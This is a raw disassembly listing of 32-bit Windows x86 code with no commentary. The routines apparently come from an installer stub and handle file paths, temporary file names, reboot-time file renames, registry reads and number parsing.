  405ea1:	c2 08 00             	ret    $0x8
  405ea4:	56                   	push   %esi
  405ea5:	8b 74 24 08          	mov    0x8(%esp),%esi
  405ea9:	56                   	push   %esi
  405eaa:	e8 f0 06 00 00       	call   0x40659f
  405eaf:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405eb2:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405eb6:	74 0c                	je     0x405ec4
  405eb8:	50                   	push   %eax
  405eb9:	56                   	push   %esi
  405eba:	ff 15 fc 81 40 00    	call   *0x4081fc
  405ec0:	3b c6                	cmp    %esi,%eax
  405ec2:	77 ee                	ja     0x405eb2
  405ec4:	66 83 20 00          	andw   $0x0,(%eax)
  405ec8:	83 c0 02             	add    $0x2,%eax
  405ecb:	5e                   	pop    %esi
  405ecc:	c2 04 00             	ret    $0x4
  405ecf:	8b 54 24 04          	mov    0x4(%esp),%edx
  405ed3:	66 8b 0a             	mov    (%edx),%cx
  405ed6:	8b c1                	mov    %ecx,%eax
  405ed8:	0c 20                	or     $0x20,%al
  405eda:	66 83 f9 5c          	cmp    $0x5c,%cx
  405ede:	75 06                	jne    0x405ee6
  405ee0:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  405ee4:	74 13                	je     0x405ef9
  405ee6:	66 3d 61 00          	cmp    $0x61,%ax
  405eea:	72 12                	jb     0x405efe
  405eec:	66 3d 7a 00          	cmp    $0x7a,%ax
  405ef0:	77 0c                	ja     0x405efe
  405ef2:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  405ef7:	75 05                	jne    0x405efe
  405ef9:	33 c0                	xor    %eax,%eax
  405efb:	40                   	inc    %eax
  405efc:	eb 02                	jmp    0x405f00
  405efe:	33 c0                	xor    %eax,%eax
  405f00:	c2 04 00             	ret    $0x4
  405f03:	53                   	push   %ebx
  405f04:	56                   	push   %esi
  405f05:	8b 35 08 82 40 00    	mov    0x408208,%esi
  405f0b:	57                   	push   %edi
  405f0c:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405f10:	57                   	push   %edi
  405f11:	ff d6                	call   *%esi
  405f13:	8b d8                	mov    %eax,%ebx
  405f15:	53                   	push   %ebx
  405f16:	ff d6                	call   *%esi
  405f18:	66 8b 0f             	mov    (%edi),%cx
  405f1b:	66 85 c9             	test   %cx,%cx
  405f1e:	74 12                	je     0x405f32
  405f20:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  405f24:	75 0c                	jne    0x405f32
  405f26:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405f2b:	75 05                	jne    0x405f32
  405f2d:	50                   	push   %eax
  405f2e:	ff d6                	call   *%esi
  405f30:	eb 28                	jmp    0x405f5a
  405f32:	66 83 f9 5c          	cmp    $0x5c,%cx
  405f36:	75 20                	jne    0x405f58
  405f38:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405f3c:	75 1a                	jne    0x405f58
  405f3e:	6a 02                	push   $0x2
  405f40:	5e                   	pop    %esi
  405f41:	6a 5c                	push   $0x5c
  405f43:	50                   	push   %eax
  405f44:	4e                   	dec    %esi
  405f45:	e8 3b ff ff ff       	call   0x405e85
  405f4a:	66 83 38 00          	cmpw   $0x0,(%eax)
  405f4e:	74 08                	je     0x405f58
  405f50:	40                   	inc    %eax
  405f51:	40                   	inc    %eax
  405f52:	85 f6                	test   %esi,%esi
  405f54:	75 eb                	jne    0x405f41
  405f56:	eb 02                	jmp    0x405f5a
  405f58:	33 c0                	xor    %eax,%eax
  405f5a:	5f                   	pop    %edi
  405f5b:	5e                   	pop    %esi
  405f5c:	5b                   	pop    %ebx
  405f5d:	c2 04 00             	ret    $0x4
  405f60:	56                   	push   %esi
  405f61:	57                   	push   %edi
  405f62:	ff 74 24 0c          	push   0xc(%esp)
  405f66:	be 10 57 42 00       	mov    $0x425710,%esi
  405f6b:	56                   	push   %esi
  405f6c:	e8 18 06 00 00       	call   0x406589
  405f71:	56                   	push   %esi
  405f72:	e8 8c ff ff ff       	call   0x405f03
  405f77:	8b f8                	mov    %eax,%edi
  405f79:	85 ff                	test   %edi,%edi
  405f7b:	75 04                	jne    0x405f81
  405f7d:	33 c0                	xor    %eax,%eax
  405f7f:	eb 58                	jmp    0x405fd9
  405f81:	57                   	push   %edi
  405f82:	e8 b0 08 00 00       	call   0x406837
  405f87:	f6 05 38 9a 42 00 80 	testb  $0x80,0x429a38
  405f8e:	74 0e                	je     0x405f9e
  405f90:	66 8b 07             	mov    (%edi),%ax
  405f93:	66 85 c0             	test   %ax,%ax
  405f96:	74 e5                	je     0x405f7d
  405f98:	66 3d 5c 00          	cmp    $0x5c,%ax
  405f9c:	74 df                	je     0x405f7d
  405f9e:	2b fe                	sub    %esi,%edi
  405fa0:	d1 ff                	sar    $1,%edi
  405fa2:	eb 14                	jmp    0x405fb8
  405fa4:	e8 3d 09 00 00       	call   0x4068e6
  405fa9:	85 c0                	test   %eax,%eax
  405fab:	74 05                	je     0x405fb2
  405fad:	f6 00 10             	testb  $0x10,(%eax)
  405fb0:	74 cb                	je     0x405f7d
  405fb2:	56                   	push   %esi
  405fb3:	e8 ec fe ff ff       	call   0x405ea4
  405fb8:	56                   	push   %esi
  405fb9:	e8 e1 05 00 00       	call   0x40659f
  405fbe:	3b c7                	cmp    %edi,%eax
  405fc0:	56                   	push   %esi
  405fc1:	7f e1                	jg     0x405fa4
  405fc3:	e8 90 fe ff ff       	call   0x405e58
  405fc8:	56                   	push   %esi
  405fc9:	ff 15 dc 80 40 00    	call   *0x4080dc
  405fcf:	33 c9                	xor    %ecx,%ecx
  405fd1:	83 f8 ff             	cmp    $0xffffffff,%eax
  405fd4:	0f 95 c1             	setne  %cl
  405fd7:	8b c1                	mov    %ecx,%eax
  405fd9:	5f                   	pop    %edi
  405fda:	5e                   	pop    %esi
  405fdb:	c2 04 00             	ret    $0x4
  405fde:	55                   	push   %ebp
  405fdf:	8b ec                	mov    %esp,%ebp
  405fe1:	51                   	push   %ecx
  405fe2:	53                   	push   %ebx
  405fe3:	56                   	push   %esi
  405fe4:	57                   	push   %edi
  405fe5:	8b 3d 28 81 40 00    	mov    0x408128,%edi
  405feb:	ff 75 0c             	push   0xc(%ebp)
  405fee:	ff d7                	call   *%edi
  405ff0:	8b 75 08             	mov    0x8(%ebp),%esi
  405ff3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405ff6:	eb 27                	jmp    0x40601f
  405ff8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405ffb:	ff 75 0c             	push   0xc(%ebp)
  405ffe:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  406001:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  406005:	56                   	push   %esi
  406006:	ff 15 6c 80 40 00    	call   *0x40806c
  40600c:	85 c0                	test   %eax,%eax
  40600e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406011:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  406014:	74 1a                	je     0x406030
  406016:	56                   	push   %esi
  406017:	ff 15 74 82 40 00    	call   *0x408274
  40601d:	8b f0                	mov    %eax,%esi
  40601f:	56                   	push   %esi
  406020:	ff d7                	call   *%edi
  406022:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  406025:	7d d1                	jge    0x405ff8
  406027:	33 c0                	xor    %eax,%eax
  406029:	5f                   	pop    %edi
  40602a:	5e                   	pop    %esi
  40602b:	5b                   	pop    %ebx
  40602c:	c9                   	leave
  40602d:	c2 08 00             	ret    $0x8
  406030:	8b c6                	mov    %esi,%eax
  406032:	eb f5                	jmp    0x406029
  406034:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406038:	56                   	push   %esi
  406039:	8b 74 24 10          	mov    0x10(%esp),%esi
  40603d:	85 f6                	test   %esi,%esi
  40603f:	76 0f                	jbe    0x406050
  406041:	8b 44 24 0c          	mov    0xc(%esp),%eax
  406045:	2b c1                	sub    %ecx,%eax
  406047:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  40604a:	88 11                	mov    %dl,(%ecx)
  40604c:	41                   	inc    %ecx
  40604d:	4e                   	dec    %esi
  40604e:	75 f7                	jne    0x406047
  406050:	5e                   	pop    %esi
  406051:	c2 0c 00             	ret    $0xc
  406054:	56                   	push   %esi
  406055:	ff 74 24 08          	push   0x8(%esp)
  406059:	ff 15 dc 80 40 00    	call   *0x4080dc
  40605f:	8b f0                	mov    %eax,%esi
  406061:	83 fe ff             	cmp    $0xffffffff,%esi
  406064:	74 0d                	je     0x406073
  406066:	24 fe                	and    $0xfe,%al
  406068:	50                   	push   %eax
  406069:	ff 74 24 0c          	push   0xc(%esp)
  40606d:	ff 15 d8 80 40 00    	call   *0x4080d8
  406073:	8b c6                	mov    %esi,%eax
  406075:	5e                   	pop    %esi
  406076:	c2 04 00             	ret    $0x4
  406079:	ff 74 24 04          	push   0x4(%esp)
  40607d:	ff 15 dc 80 40 00    	call   *0x4080dc
  406083:	8b c8                	mov    %eax,%ecx
  406085:	6a 00                	push   $0x0
  406087:	41                   	inc    %ecx
  406088:	f7 d9                	neg    %ecx
  40608a:	1b c9                	sbb    %ecx,%ecx
  40608c:	23 c8                	and    %eax,%ecx
  40608e:	51                   	push   %ecx
  40608f:	ff 74 24 14          	push   0x14(%esp)
  406093:	6a 00                	push   $0x0
  406095:	6a 01                	push   $0x1
  406097:	ff 74 24 1c          	push   0x1c(%esp)
  40609b:	ff 74 24 1c          	push   0x1c(%esp)
  40609f:	ff 15 70 80 40 00    	call   *0x408070
  4060a5:	c2 0c 00             	ret    $0xc
  4060a8:	55                   	push   %ebp
  4060a9:	8b ec                	mov    %esp,%ebp
  4060ab:	51                   	push   %ecx
  4060ac:	51                   	push   %ecx
  4060ad:	56                   	push   %esi
  4060ae:	8b 75 08             	mov    0x8(%ebp),%esi
  4060b1:	57                   	push   %edi
  4060b2:	6a 64                	push   $0x64
  4060b4:	5f                   	pop    %edi
  4060b5:	a1 78 a5 40 00       	mov    0x40a578,%eax
  4060ba:	4f                   	dec    %edi
  4060bb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4060be:	a1 7c a5 40 00       	mov    0x40a57c,%eax
  4060c3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4060c6:	ff 15 d0 80 40 00    	call   *0x4080d0
  4060cc:	6a 1a                	push   $0x1a
  4060ce:	33 d2                	xor    %edx,%edx
  4060d0:	59                   	pop    %ecx
  4060d1:	f7 f1                	div    %ecx
  4060d3:	56                   	push   %esi
  4060d4:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4060d7:	6a 00                	push   $0x0
  4060d9:	50                   	push   %eax
  4060da:	ff 75 0c             	push   0xc(%ebp)
  4060dd:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  4060e1:	ff 15 74 80 40 00    	call   *0x408074
  4060e7:	85 c0                	test   %eax,%eax
  4060e9:	75 0d                	jne    0x4060f8
  4060eb:	85 ff                	test   %edi,%edi
  4060ed:	75 c6                	jne    0x4060b5
  4060ef:	66 21 3e             	and    %di,(%esi)
  4060f2:	5f                   	pop    %edi
  4060f3:	5e                   	pop    %esi
  4060f4:	c9                   	leave
  4060f5:	c2 08 00             	ret    $0x8
  4060f8:	8b c6                	mov    %esi,%eax
  4060fa:	eb f6                	jmp    0x4060f2
  4060fc:	55                   	push   %ebp
  4060fd:	8b ec                	mov    %esp,%ebp
  4060ff:	56                   	push   %esi
  406100:	8b 75 10             	mov    0x10(%ebp),%esi
  406103:	8d 45 10             	lea    0x10(%ebp),%eax
  406106:	6a 00                	push   $0x0
  406108:	50                   	push   %eax
  406109:	56                   	push   %esi
  40610a:	ff 75 0c             	push   0xc(%ebp)
  40610d:	ff 75 08             	push   0x8(%ebp)
  406110:	ff 15 30 81 40 00    	call   *0x408130
  406116:	85 c0                	test   %eax,%eax
  406118:	74 0a                	je     0x406124
  40611a:	3b 75 10             	cmp    0x10(%ebp),%esi
  40611d:	75 05                	jne    0x406124
  40611f:	33 c0                	xor    %eax,%eax
  406121:	40                   	inc    %eax
  406122:	eb 02                	jmp    0x406126
  406124:	33 c0                	xor    %eax,%eax
  406126:	5e                   	pop    %esi
  406127:	5d                   	pop    %ebp
  406128:	c2 0c 00             	ret    $0xc
  40612b:	55                   	push   %ebp
  40612c:	8b ec                	mov    %esp,%ebp
  40612e:	56                   	push   %esi
  40612f:	8b 75 10             	mov    0x10(%ebp),%esi
  406132:	8d 45 10             	lea    0x10(%ebp),%eax
  406135:	6a 00                	push   $0x0
  406137:	50                   	push   %eax
  406138:	56                   	push   %esi
  406139:	ff 75 0c             	push   0xc(%ebp)
  40613c:	ff 75 08             	push   0x8(%ebp)
  40613f:	ff 15 b8 80 40 00    	call   *0x4080b8
  406145:	85 c0                	test   %eax,%eax
  406147:	74 0a                	je     0x406153
  406149:	3b 75 10             	cmp    0x10(%ebp),%esi
  40614c:	75 05                	jne    0x406153
  40614e:	33 c0                	xor    %eax,%eax
  406150:	40                   	inc    %eax
  406151:	eb 02                	jmp    0x406155
  406153:	33 c0                	xor    %eax,%eax
  406155:	5e                   	pop    %esi
  406156:	5d                   	pop    %ebp
  406157:	c2 0c 00             	ret    $0xc
  40615a:	55                   	push   %ebp
  40615b:	8b ec                	mov    %esp,%ebp
  40615d:	53                   	push   %ebx
  40615e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406161:	56                   	push   %esi
  406162:	8b 35 34 81 40 00    	mov    0x408134,%esi
  406168:	57                   	push   %edi
  406169:	33 ff                	xor    %edi,%edi
  40616b:	6a 01                	push   $0x1
  40616d:	57                   	push   %edi
  40616e:	57                   	push   %edi
  40616f:	53                   	push   %ebx
  406170:	ff d6                	call   *%esi
  406172:	85 c0                	test   %eax,%eax
  406174:	75 4f                	jne    0x4061c5
  406176:	8d 45 0a             	lea    0xa(%ebp),%eax
  406179:	6a 02                	push   $0x2
  40617b:	50                   	push   %eax
  40617c:	53                   	push   %ebx
  40617d:	e8 7a ff ff ff       	call   0x4060fc
  406182:	85 c0                	test   %eax,%eax
  406184:	74 0c                	je     0x406192
  406186:	66 81 7d 0a ff fe    	cmpw   $0xfeff,0xa(%ebp)
  40618c:	75 04                	jne    0x406192
  40618e:	33 c0                	xor    %eax,%eax
  406190:	eb 36                	jmp    0x4061c8
  406192:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  406195:	74 28                	je     0x4061bf
  406197:	6a 01                	push   $0x1
  406199:	57                   	push   %edi
  40619a:	57                   	push   %edi
  40619b:	53                   	push   %ebx
  40619c:	ff d6                	call   *%esi
  40619e:	85 c0                	test   %eax,%eax
  4061a0:	75 1d                	jne    0x4061bf
  4061a2:	6a 02                	push   $0x2
  4061a4:	68 14 84 40 00       	push   $0x408414
  4061a9:	53                   	push   %ebx
  4061aa:	e8 7c ff ff ff       	call   0x40612b
  4061af:	f7 d8                	neg    %eax
  4061b1:	1b c0                	sbb    %eax,%eax
  4061b3:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  4061b8:	05 05 40 00 80       	add    $0x80004005,%eax
  4061bd:	eb 09                	jmp    0x4061c8
  4061bf:	57                   	push   %edi
  4061c0:	57                   	push   %edi
  4061c1:	57                   	push   %edi
  4061c2:	53                   	push   %ebx
  4061c3:	ff d6                	call   *%esi
  4061c5:	33 c0                	xor    %eax,%eax
  4061c7:	40                   	inc    %eax
  4061c8:	5f                   	pop    %edi
  4061c9:	5e                   	pop    %esi
  4061ca:	5b                   	pop    %ebx
  4061cb:	5d                   	pop    %ebp
  4061cc:	c2 08 00             	ret    $0x8
  4061cf:	53                   	push   %ebx
  4061d0:	8b 1d ec 80 40 00    	mov    0x4080ec,%ebx
  4061d6:	55                   	push   %ebp
  4061d7:	56                   	push   %esi
  4061d8:	8b 74 24 14          	mov    0x14(%esp),%esi
  4061dc:	57                   	push   %edi
  4061dd:	85 f6                	test   %esi,%esi
  4061df:	c7 05 a8 65 42 00 4e 	movl   $0x55004e,0x4265a8
  4061e6:	00 55 00 
  4061e9:	c7 05 ac 65 42 00 4c 	movl   $0x4c,0x4265ac
  4061f0:	00 00 00 
  4061f3:	bf 00 04 00 00       	mov    $0x400,%edi
  4061f8:	bd a8 65 42 00       	mov    $0x4265a8,%ebp
  4061fd:	74 26                	je     0x406225
  4061ff:	6a 01                	push   $0x1
  406201:	6a 00                	push   $0x0
  406203:	56                   	push   %esi
  406204:	e8 70 fe ff ff       	call   0x406079
  406209:	50                   	push   %eax
  40620a:	ff 15 fc 80 40 00    	call   *0x4080fc
  406210:	57                   	push   %edi
  406211:	55                   	push   %ebp
  406212:	56                   	push   %esi
  406213:	ff d3                	call   *%ebx
  406215:	85 c0                	test   %eax,%eax
  406217:	0f 84 27 01 00 00    	je     0x406344
  40621d:	3b c7                	cmp    %edi,%eax
  40621f:	0f 8f 1f 01 00 00    	jg     0x406344
  406225:	be a8 6d 42 00       	mov    $0x426da8,%esi
  40622a:	57                   	push   %edi
  40622b:	56                   	push   %esi
  40622c:	ff 74 24 1c          	push   0x1c(%esp)
  406230:	ff d3                	call   *%ebx
  406232:	85 c0                	test   %eax,%eax
  406234:	0f 84 0a 01 00 00    	je     0x406344
  40623a:	3b c7                	cmp    %edi,%eax
  40623c:	0f 8f 02 01 00 00    	jg     0x406344
  406242:	56                   	push   %esi
  406243:	55                   	push   %ebp
  406244:	68 90 a5 40 00       	push   $0x40a590
  406249:	68 a8 61 42 00       	push   $0x4261a8
  40624e:	ff 15 78 82 40 00    	call   *0x408278
  406254:	8b d8                	mov    %eax,%ebx
  406256:	a1 30 9a 42 00       	mov    0x429a30,%eax
  40625b:	83 c4 10             	add    $0x10,%esp
  40625e:	ff b0 28 01 00 00    	push   0x128(%eax)
  406264:	56                   	push   %esi
  406265:	e8 5c 03 00 00       	call   0x4065c6
  40626a:	6a 04                	push   $0x4
  40626c:	68 00 00 00 c0       	push   $0xc0000000
  406271:	56                   	push   %esi
  406272:	e8 02 fe ff ff       	call   0x406079
  406277:	8b e8                	mov    %eax,%ebp
  406279:	83 fd ff             	cmp    $0xffffffff,%ebp
  40627c:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  406280:	0f 84 be 00 00 00    	je     0x406344
  406286:	6a 00                	push   $0x0
  406288:	55                   	push   %ebp
  406289:	ff 15 cc 80 40 00    	call   *0x4080cc
  40628f:	8b f8                	mov    %eax,%edi
  406291:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  406295:	50                   	push   %eax
  406296:	6a 40                	push   $0x40
  406298:	ff 15 10 81 40 00    	call   *0x408110
  40629e:	8b f0                	mov    %eax,%esi
  4062a0:	85 f6                	test   %esi,%esi
  4062a2:	0f 84 95 00 00 00    	je     0x40633d
  4062a8:	57                   	push   %edi
  4062a9:	56                   	push   %esi
  4062aa:	55                   	push   %ebp
  4062ab:	e8 4c fe ff ff       	call   0x4060fc
  4062b0:	85 c0                	test   %eax,%eax
  4062b2:	0f 84 85 00 00 00    	je     0x40633d
  4062b8:	68 84 a5 40 00       	push   $0x40a584
  4062bd:	56                   	push   %esi
  4062be:	e8 1b fd ff ff       	call   0x405fde
  4062c3:	85 c0                	test   %eax,%eax
  4062c5:	75 14                	jne    0x4062db
  4062c7:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  4062ca:	68 84 a5 40 00       	push   $0x40a584
  4062cf:	50                   	push   %eax
  4062d0:	ff 15 4c 81 40 00    	call   *0x40814c
  4062d6:	83 c7 0a             	add    $0xa,%edi
  4062d9:	eb 35                	jmp    0x406310
  4062db:	83 c0 0a             	add    $0xa,%eax
  4062de:	68 80 a5 40 00       	push   $0x40a580
  4062e3:	50                   	push   %eax
  4062e4:	e8 f5 fc ff ff       	call   0x405fde
  4062e9:	8b e8                	mov    %eax,%ebp
  4062eb:	85 ed                	test   %ebp,%ebp
  4062ed:	74 1d                	je     0x40630c
  4062ef:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  4062f2:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  4062f5:	eb 06                	jmp    0x4062fd
  4062f7:	8a 11                	mov    (%ecx),%dl
  4062f9:	88 10                	mov    %dl,(%eax)
  4062fb:	48                   	dec    %eax
  4062fc:	49                   	dec    %ecx
  4062fd:	3b cd                	cmp    %ebp,%ecx
  4062ff:	77 f6                	ja     0x4062f7
  406301:	2b ee                	sub    %esi,%ebp
  406303:	45                   	inc    %ebp
  406304:	8b c5                	mov    %ebp,%eax
  406306:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  40630a:	eb 06                	jmp    0x406312
  40630c:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406310:	8b c7                	mov    %edi,%eax
  406312:	53                   	push   %ebx
  406313:	03 c6                	add    %esi,%eax
  406315:	68 a8 61 42 00       	push   $0x4261a8
  40631a:	50                   	push   %eax
  40631b:	e8 14 fd ff ff       	call   0x406034
  406320:	33 c0                	xor    %eax,%eax
  406322:	50                   	push   %eax
  406323:	50                   	push   %eax
  406324:	50                   	push   %eax
  406325:	55                   	push   %ebp
  406326:	ff 15 34 81 40 00    	call   *0x408134
  40632c:	03 fb                	add    %ebx,%edi
  40632e:	57                   	push   %edi
  40632f:	56                   	push   %esi
  406330:	55                   	push   %ebp
  406331:	e8 f5 fd ff ff       	call   0x40612b
  406336:	56                   	push   %esi
  406337:	ff 15 0c 81 40 00    	call   *0x40810c
  40633d:	55                   	push   %ebp
  40633e:	ff 15 fc 80 40 00    	call   *0x4080fc
  406344:	5f                   	pop    %edi
  406345:	5e                   	pop    %esi
  406346:	5d                   	pop    %ebp
  406347:	5b                   	pop    %ebx
  406348:	c3                   	ret
  406349:	6a 05                	push   $0x5
  40634b:	ff 74 24 0c          	push   0xc(%esp)
  40634f:	ff 74 24 0c          	push   0xc(%esp)
  406353:	ff 15 50 81 40 00    	call   *0x408150
  406359:	85 c0                	test   %eax,%eax
  40635b:	75 0f                	jne    0x40636c
  40635d:	ff 74 24 08          	push   0x8(%esp)
  406361:	ff 74 24 08          	push   0x8(%esp)
  406365:	e8 65 fe ff ff       	call   0x4061cf
  40636a:	59                   	pop    %ecx
  40636b:	59                   	pop    %ecx
  40636c:	ff 05 b0 9a 42 00    	incl   0x429ab0
  406372:	c2 08 00             	ret    $0x8
  406375:	53                   	push   %ebx
  406376:	33 db                	xor    %ebx,%ebx
  406378:	38 1d dc 9a 42 00    	cmp    %bl,0x429adc
  40637e:	56                   	push   %esi
  40637f:	8b 74 24 10          	mov    0x10(%esp),%esi
  406383:	57                   	push   %edi
  406384:	0f 9c c3             	setl   %bl
  406387:	8b 06                	mov    (%esi),%eax
  406389:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40638d:	f7 db                	neg    %ebx
  40638f:	1b db                	sbb    %ebx,%ebx
  406391:	32 db                	xor    %bl,%bl
  406393:	81 c3 00 01 00 00    	add    $0x100,%ebx
  406399:	a8 20                	test   $0x20,%al
  40639b:	74 32                	je     0x4063cf
  40639d:	f7 c7 00 00 00 60    	test   $0x60000000,%edi
  4063a3:	74 2a                	je     0x4063cf
  4063a5:	8b cf                	mov    %edi,%ecx
  4063a7:	ba 00 03 00 00       	mov    $0x300,%edx
  4063ac:	c1 e9 15             	shr    $0x15,%ecx
  4063af:	23 ca                	and    %edx,%ecx
  4063b1:	3b ca                	cmp    %edx,%ecx
  4063b3:	75 0a                	jne    0x4063bf
  4063b5:	8b cb                	mov    %ebx,%ecx
  4063b7:	f7 d1                	not    %ecx
  4063b9:	23 0d d0 9a 42 00    	and    0x429ad0,%ecx
  4063bf:	80 e4 fe             	and    $0xfe,%ah
  4063c2:	0b c1                	or     %ecx,%eax
  4063c4:	80 e4 fd             	and    $0xfd,%ah
  4063c7:	81 e7 ff ff ff 9f    	and    $0x9fffffff,%edi
  4063cd:	eb 0d                	jmp    0x4063dc
  4063cf:	a9 00 00 10 00       	test   $0x100000,%eax
  4063d4:	74 06                	je     0x4063dc
  4063d6:	0b 05 d0 9a 42 00    	or     0x429ad0,%eax
  4063dc:	8b c8                	mov    %eax,%ecx
  4063de:	23 c3                	and    %ebx,%eax
  4063e0:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  4063e6:	f7 d8                	neg    %eax
  4063e8:	1b c0                	sbb    %eax,%eax
  4063ea:	89 0e                	mov    %ecx,(%esi)
  4063ec:	f7 d0                	not    %eax
  4063ee:	23 c7                	and    %edi,%eax
  4063f0:	5f                   	pop    %edi
  4063f1:	5e                   	pop    %esi
  4063f2:	5b                   	pop    %ebx
  4063f3:	c2 08 00             	ret    $0x8
  4063f6:	55                   	push   %ebp
  4063f7:	8b ec                	mov    %esp,%ebp
  4063f9:	8d 45 10             	lea    0x10(%ebp),%eax
  4063fc:	50                   	push   %eax
  4063fd:	ff 75 08             	push   0x8(%ebp)
  406400:	e8 70 ff ff ff       	call   0x406375
  406405:	85 c0                	test   %eax,%eax
  406407:	75 05                	jne    0x40640e
  406409:	6a 06                	push   $0x6
  40640b:	58                   	pop    %eax
  40640c:	eb 12                	jmp    0x406420
  40640e:	ff 75 14             	push   0x14(%ebp)
  406411:	ff 75 10             	push   0x10(%ebp)
  406414:	6a 00                	push   $0x0
  406416:	ff 75 0c             	push   0xc(%ebp)
  406419:	50                   	push   %eax
  40641a:	ff 15 28 80 40 00    	call   *0x408028
  406420:	5d                   	pop    %ebp
  406421:	c2 10 00             	ret    $0x10
  406424:	55                   	push   %ebp
  406425:	8b ec                	mov    %esp,%ebp
  406427:	8d 45 10             	lea    0x10(%ebp),%eax
  40642a:	50                   	push   %eax
  40642b:	ff 75 08             	push   0x8(%ebp)
  40642e:	e8 42 ff ff ff       	call   0x406375
  406433:	33 c9                	xor    %ecx,%ecx
  406435:	3b c1                	cmp    %ecx,%eax
  406437:	75 05                	jne    0x40643e
  406439:	6a 06                	push   $0x6
  40643b:	58                   	pop    %eax
  40643c:	eb 15                	jmp    0x406453
  40643e:	51                   	push   %ecx
  40643f:	ff 75 14             	push   0x14(%ebp)
  406442:	51                   	push   %ecx
  406443:	ff 75 10             	push   0x10(%ebp)
  406446:	51                   	push   %ecx
  406447:	51                   	push   %ecx
  406448:	51                   	push   %ecx
  406449:	ff 75 0c             	push   0xc(%ebp)
  40644c:	50                   	push   %eax
  40644d:	ff 15 2c 80 40 00    	call   *0x40802c
  406453:	5d                   	pop    %ebp
  406454:	c2 10 00             	ret    $0x10
  406457:	55                   	push   %ebp
  406458:	8b ec                	mov    %esp,%ebp
  40645a:	51                   	push   %ecx
  40645b:	8d 45 18             	lea    0x18(%ebp),%eax
  40645e:	56                   	push   %esi
  40645f:	50                   	push   %eax
  406460:	8b 45 18             	mov    0x18(%ebp),%eax
  406463:	f7 d8                	neg    %eax
  406465:	1b c0                	sbb    %eax,%eax
  406467:	c7 45 fc 00 08 00 00 	movl   $0x800,-0x4(%ebp)
  40646e:	25 00 01 00 00       	and    $0x100,%eax
  406473:	0d 19 00 02 00       	or     $0x20019,%eax
  406478:	50                   	push   %eax
  406479:	ff 75 0c             	push   0xc(%ebp)
  40647c:	ff 75 08             	push   0x8(%ebp)
  40647f:	e8 72 ff ff ff       	call   0x4063f6
  406484:	8b 75 14             	mov    0x14(%ebp),%esi
  406487:	85 c0                	test   %eax,%eax
  406489:	75 3c                	jne    0x4064c7
  40648b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40648e:	57                   	push   %edi
  40648f:	50                   	push   %eax
  406490:	8d 45 0c             	lea    0xc(%ebp),%eax
  406493:	56                   	push   %esi
  406494:	50                   	push   %eax
  406495:	6a 00                	push   $0x0
  406497:	ff 75 10             	push   0x10(%ebp)
  40649a:	ff 75 18             	push   0x18(%ebp)
  40649d:	ff 15 08 80 40 00    	call   *0x408008
  4064a3:	ff 75 18             	push   0x18(%ebp)
  4064a6:	8b f8                	mov    %eax,%edi
  4064a8:	ff 15 10 80 40 00    	call   *0x408010
  4064ae:	66 83 a6 fe 07 00 00 	andw   $0x0,0x7fe(%esi)
  4064b5:	00 
  4064b6:	85 ff                	test   %edi,%edi
  4064b8:	5f                   	pop    %edi
  4064b9:	75 0c                	jne    0x4064c7
  4064bb:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4064bf:	74 0a                	je     0x4064cb
  4064c1:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4064c5:	74 04                	je     0x4064cb
  4064c7:	66 83 26 00          	andw   $0x0,(%esi)
  4064cb:	5e                   	pop    %esi
  4064cc:	c9                   	leave
  4064cd:	c2 14 00             	ret    $0x14
  4064d0:	ff 74 24 08          	push   0x8(%esp)
  4064d4:	68 18 84 40 00       	push   $0x408418
  4064d9:	ff 74 24 0c          	push   0xc(%esp)
  4064dd:	ff 15 2c 82 40 00    	call   *0x40822c
  4064e3:	83 c4 0c             	add    $0xc,%esp
  4064e6:	c2 08 00             	ret    $0x8
  4064e9:	55                   	push   %ebp
  4064ea:	8b ec                	mov    %esp,%ebp
  4064ec:	51                   	push   %ecx
  4064ed:	51                   	push   %ecx
  4064ee:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4064f1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4064f5:	53                   	push   %ebx
  4064f6:	56                   	push   %esi
  4064f7:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  4064fb:	6a 0a                	push   $0xa
  4064fd:	58                   	pop    %eax
  4064fe:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  406505:	6a 39                	push   $0x39
  406507:	5b                   	pop    %ebx
  406508:	75 06                	jne    0x406510
  40650a:	41                   	inc    %ecx
  40650b:	41                   	inc    %ecx
  40650c:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406510:	66 83 39 30          	cmpw   $0x30,(%ecx)
  406514:	75 27                	jne    0x40653d
